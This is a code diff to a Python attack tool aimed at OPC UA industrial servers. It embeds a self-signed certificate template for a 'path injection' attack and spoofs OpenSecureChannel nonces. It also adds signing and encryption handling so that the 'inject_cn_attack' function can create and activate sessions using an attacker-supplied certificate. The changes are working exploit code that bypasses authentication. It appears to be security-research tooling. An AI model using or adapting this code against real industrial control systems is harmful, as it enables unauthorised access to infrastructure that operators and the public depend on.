@@ -29,7 +29,8 @@ def ceildiv(a,b):
   return a // b + (a % b and 1)
   
 # Self signed certificate template (DER encoded) used for path injection attack.
-SELFSIGNED_CERT_TEMPLATE = b64decode('MIIE6TCCA9GgAwIBAgIKEtz1iOEt2W2zvjANBgkqhkiG9w0BAQsFADB9MSAwHgYKCZImiZPyLGQBGRMQdHRlcnZvb3J0LXNlY3VyYTEXMBUGA1UEChMOT1BDIEZvdW5kYXRpb24xEDAOBgNVBAgTB0FyaXpvbmExCzAJBgNVBAYTAlVTMSEwHwYDVQQDExhDb25zb2xlIFJlZmVyZW5jZSBDbGllbnQwHhcNMjQwMzEwMDAwMDAwWhcNMjUwMzEwMDAwMDAwWjB9MSAwHgYKCZImiZPyLGQBGRMQdHRlcnZvb3J0LXNlY3VyYTEXMBUGA1UEChMOT1BDIEZvdW5kYXRpb24xEDAOBgNVBAgTB0FyaXpvbmExCzAJBgNVBAYTAlVTMSEwHwYDVQQDExhDb25zb2xlIFJlZmVyZW5jZSBDbGllbnQwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQCVZar5gJGUm88hIcuTautbRnZ/TvBx4nezaab9djeHTCmx0EezCS/2LSAnCv3uYumvpvd5s03eEPfQ0s26wKqgUj4eKCn2XTukaORJu/jb9mGoD40bRwrMDMxW5CpHZ0xFgnyKHb3QbzzvwFwGTx1bXGz9xMe+J9r5mNzsHVZ46aVOScOrF44ZyRwbNkWAhIiXKgrJoHLKA6LN6iBA+kkKTZc7q+GsoEM5O4pwAXATqMGmsFaV/I05x7CckrNgUVZfT2PwwRMZ1hKITu1Z/Jti6dUzxyF5qWFoL5TDNKFQYPtR13LaQpQkzUqkw8VkUeBiT+hFsiT4GkYuo9Emv9TxAgMBAAGjggFpMIIBZTAMBgNVHRMBAf8EAjAAMB0GA1UdDgQWBBTJcPReZqL1YOptopao2c+m/nvp8DCBsQYDVR0jBIGpMIGmgBTJcPReZqL1YOptopao2c+m/nvp8KGBgaR/MH0xIDAeBgoJkiaJk/IsZAEZExB0dGVydm9vcnQtc2VjdXJhMRcwFQYDVQQKEw5PUEMgRm91bmRhdGlvbjEQMA4GA1UECBMHQXJpem9uYTELMAkGA1UEBhMCVVMxITAfBgNVBAMTGENvbnNvbGUgUmVmZXJlbmNlIENsaWVudIIKEtz1iOEt2W2zvjAOBgNVHQ8BAf8EBAMCAvQwIAYDVR0lAQH/BBYwFAYIKwYBBQUHAwEGCCsGAQUFBwMCMFAGA1UdEQRJMEeGM3Vybjp0dGVydm9vcnQtc2VjdXJhOlVBOlF1aWNrc3RhcnRzOlJlZmVyZW5jZUNsaWVudIIQdHRlcnZvb3J0LXNlY3VyYTANBgkqhkiG9w0BAQsFAAOCAQEAjw9zu/9SPD6iOex67jS/xaKc7JhWTa7JBZjY7xPYEhnxSwkyMW7I8AkAK/d5w9/WJl0I2dTlZ8ftKKUFjOV7TrNhT2TNuYVqq9OZQhJYKEPmfUhb5oAHqGLWCixyDfiez69hLii0QT5qVYi5rR5S+C0KQ3uNXRt3subM3edND9LSuUc3DTfc2r6ZFQ9SR0Y0BCf3gLyB7VPrVKxpKspNjTv/5y3dSI4q1VNA+q8OaXxSVUVlTN/Nlg8euWELiHeGGHu3EKqje1swN4cLXoSWfhn6qW/x/PvcUZMvK2xrukrR1f1SR/R9gZm0SKeEEq0nRrn1ASPB5sMtOWPxdruSKA==')
+SELFSIGNED_CERT_TEMPLATE = b64decode('MIIERDCCAyygAwIBAgIUcC5NBws70ghGv3jjkdIBjlcDRgMwDQYJKoZIhvcNAQELBQAwXTEUMBIGCgmSJomT8ixkARkWBHRlc3QxFzAVBgNVBAoMDk9QQyBGb3VuZGF0aW9uMRAwDgYDVQQIDAdBcml6b25hMQswCQYDVQQGEwJVUzENMAsGA1UEAwwEdGVzdDAeFw0yNDAzMTkxNDAwMTZaFw0yNTAzMTkxNDAwMTZaMF0xFDASBgoJkiaJk/IsZAEZFgR0ZXN0MRcwFQYDVQQKDA5PUEMgRm91bmRhdGlvbjEQMA4GA1UECAwHQXJpem9uYTELMAkGA1UEBhMCVVMxDTALBgNVBAMMBHRlc3QwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDGw8ewnzA+09uDx3zJd96FHLmzX2JhmTHdelPQgFz1UQxT1JLdjZv8uIpV5chcl/fvRga9kWzNS3YtADyG0LfmGfA6M5j/sfUatfOBEe1UJEO3TFpvRaeQd9KIIWk9XR5ue0bihR5Wk59f5jvo/RY4J/t3rWUny7R3HXrWxSlY0iskr3+sRkRIcYqqHehsCtJ2k1ZNUcN1HHV+FicRuf695Os1aoXBi/ViX1A4/3UmOrsHCXThj/4zEfbG5puJHBf5SMbjBjoZu7uCrYA53r/Wt3zLAnxKdbJjZ9nJP0x2pyzwd19JtqGqvKICdG/NKArjVxjjY2jqzGN/ExWB2mUbAgMBAAGjgfswgfgwDAYDVR0TAQH/BAIwADAOBgNVHQ8BAf8EBAMCAvQwIAYDVR0lAQH/BBYwFAYIKwYBBQUHAwEGCCsGAQUFBwMCMA8GA1UdEQQIMAaGBHRlc3QwgYUGA1UdIwR+MHyAFIHIizG1yMWN1z6tsU9VYpeAyqoloWGkXzBdMRQwEgYKCZImiZPyLGQBGRYEdGVzdDEXMBUGA1UECgwOT1BDIEZvdW5kYXRpb24xEDAOBgNVBAgMB0FyaXpvbmExCzAJBgNVBAYTAlVTMQ0wCwYDVQQDDAR0ZXN0ggF7MB0GA1UdDgQWBBSByIsxtcjFjdc+rbFPVWKXgMqqJTANBgkqhkiG9w0BAQsFAAOCAQEAb9vxdW04fyXxjdNEHY5R4vDTNzyK2BIwb264tgrAtmAohXL4QqyXFxF6NcnpRv9n2iGhWLUpvE/LbGmU0s7Y8QmHHcngpwRkmasUlEUut3h9cZ9xshPrkVvNTY+SpSCzrNTL3dKv5AN04we6GZAPAhSfNeFKy80qQRxQYvuqL+/FqVCqjtLhQLxH8KQDtklCcDJh0YGgxesO7Zc1QhgFXg/YzcNEb3htgETpe281LCAxWJbhKqY+DuIeR/68halfxfryf10TRGcYYJG6H31jA69EJnaX3FwP592Gr5PY53VCuxQySOTUUKLkE4EdjRwA5SL8HabrCAebscOdwAeVLA==')
+TEMPLATE_APP_URI = 'test'
 
 # Fixed clientNonce value used within spoofed OpenSecureChannel requests.
 SPOOFED_OPN_NONCE = unhexlify('1337133713371337133713371337133713371337133713371337133713371337')
@@ -105,6 +106,7 @@ class ChannelState:
   channel_id: int
   token_id : int
   msg_counter : int
+  securityMode : MessageSecurityMode
   crypto: Optional[SessionCrypto]
 
 # Attempt to start a "Secure" channel with no signing or encryption.
@@ -135,6 +137,7 @@ def unencrypted_opn(sock: socket) -> ChannelState:
     channel_id=resp.securityToken.channelId,
     token_id=resp.securityToken.tokenId,
     msg_counter=2,
+    securityMode=MessageSecurityMode.NONE,
     crypto=None,
   )
   
@@ -176,6 +179,8 @@ def authenticated_opn(sock : socket, endpoint : endpointDescription.Type, client
       sigsize=pk.size_in_bytes(),
     )    
     replymsg = opc_exchange(sock, msg)
+    
+    # Immediately start parsing plaintext, ignoring padding and signature.
     convrep, _ = encodedConversation.from_bytes(rsa_ecb_decrypt(sp, privkey, replymsg.encodedPart))
     resp, _ = openSecureChannelResponse.from_bytes(convrep.requestOrResponse)
     
@@ -184,6 +189,7 @@ def authenticated_opn(sock : socket, endpoint : endpointDescription.Type, client
       channel_id=resp.securityToken.channelId,
       token_id=resp.securityToken.tokenId,
       msg_counter=2,
+      securityMode=endpoint.securityMode,
       crypto=deriveKeyMaterial(sp, client_nonce, resp.serverNonce)
     )
 
@@ -203,39 +209,30 @@ def session_exchange(channel : ChannelState,
   )
   
   crypto = channel.crypto
-  if crypto:
-    
-    
-    
-    raise Exception('TODO: bugfix session crypto')
-    # Add padding and signing into encoded message.
-    basemsg = msg.to_bytes()
-    padbyte = 16 - (len(basemsg) + 1) % 16
-    padding = (padbyte + 1) * bytes([padbyte])
-    macinput = basemsg + padding
-    macinput = macinput[:4] + IntField().to_bytes(len(macinput) + macsize(crypto.policy)) + macinput[8:]
-    mac = sha_hmac(crypto.policy, crypto.clientKeys.signingKey, macinput + padding)
-    plaintext = msg.encodedPart + padding + mac
-    
-    # Encrypt encoded part.
-    msg.encodedPart = aes_cbc_encrypt(crypto.clientKeys.encryptionKey, crypto.clientKeys.iv, plaintext)
+  assert crypto or channel.securityMode == MessageSecurityMode.NONE
+  if channel.securityMode == MessageSecurityMode.SIGN_AND_ENCRYPT:
+    msg.sign_and_encrypt(
+      signer=lambda data: sha_hmac(crypto.policy, crypto.clientKeys.signingKey, data),
+      encrypter=lambda ptext: aes_cbc_encrypt(crypto.clientKeys.encryptionKey, crypto.clientKeys.iv, ptext),
+      plainblocksize=16,
+      cipherblocksize=16,
+      sigsize=macsize(crypto.policy),
+    )
+  elif channel.securityMode == MessageSecurityMode.SIGN:
+    msg.sign(lambda data: sha_hmac(crypto.policy, crypto.clientKeys.signingKey, data), macsize(crypto.policy))
     
   # Do the exchange.
   reply = opc_exchange(channel.sock, msg)
   
-  if crypto:
+  decodedPart = reply.encodedPart
+  if channel.securityMode == MessageSecurityMode.SIGN_AND_ENCRYPT:
     # Decrypt.
-    plaintext = aes_cbc_decrypt(crypto.serverKeys.encryptionKey, crypto.serverKeys.iv, reply.encodedPart)
-    
-    # Remove signature and padding. Don't bother to validate.
-    decodedPart = pkcs7_unpad(plaintext[:macsize(crypto.policy)])
-  else:
-    decodedPart = reply.encodedPart
-    
+    decodedPart = aes_cbc_decrypt(crypto.serverKeys.encryptionKey, crypto.serverKeys.iv, decodedPart)
+
   # Increment the message counter.
   channel.msg_counter += 1
     
-  # Parse the response.
+  # Parse the response, ignoring any padding and MAC.
   convo, _ = encodedConversation.from_bytes(decodedPart)
   resp, _ = respfield.from_bytes(convo.requestOrResponse)
   return resp
@@ -989,7 +986,7 @@ def inject_cn_attack(url : str, cn : str, second_login : bool, demo : bool):
       createreply = generic_exchange(chan, ep.securityPolicyUri, createSessionRequest, createSessionResponse, 
         requestHeader=simple_requestheader(),
         clientDescription=applicationDescription.create(
-          applicationUri=cn,
+          applicationUri=TEMPLATE_APP_URI,
           productUri=cn,
           applicationName=LocalizedText(text=cn),
           applicationType=ApplicationType.CLIENT,
@@ -1006,19 +1003,22 @@ def inject_cn_attack(url : str, cn : str, second_login : bool, demo : bool):
         maxResponseMessageSize=2**24,
       )
       log_success('CreateSessionRequest with certificate accepted.')
-      anon_policies = [p for p in login_endpoint.userIdentityTokens if p.tokenType == UserTokenType.ANONYMOUS]
+      anon_policies = [p for p in ep.userIdentityTokens if p.tokenType == UserTokenType.ANONYMOUS]
       if anon_policies:
         log('Trying to activate session.')
         activatereply = generic_exchange(chan, ep.securityPolicyUri, activateSessionRequest, activateSessionResponse, 
           requestHeader=simple_requestheader(createreply.authenticationToken),
-          clientSignature=rsa_sign(ep.securityPolicyUri, privkey, ep.serverCertificate + createreply.serverNonce),
+          clientSignature=signatureData.create(
+            algorithm=rsa_siguri(ep.securityPolicyUri),
+            signature=rsa_sign(ep.securityPolicyUri, privkey, ep.serverCertificate + createreply.serverNonce),
+          ),
           clientSoftwareCertificates=[],
           localeIds=[],
           userIdentityToken=anonymousIdentityToken.create(policyId=anon_policies[0].policyId),
           userTokenSignature=signatureData.create(algorithm=None,signature=None),
         )
         log_success('Authentication with certificate was succesfull!')
-        return chan, activatereply.authenticationToken
+        return chan, createreply.authenticationToken
       else:
         log(f'Server requires user authentication, which is not implemented for this attack. Will stop here.')
         return None
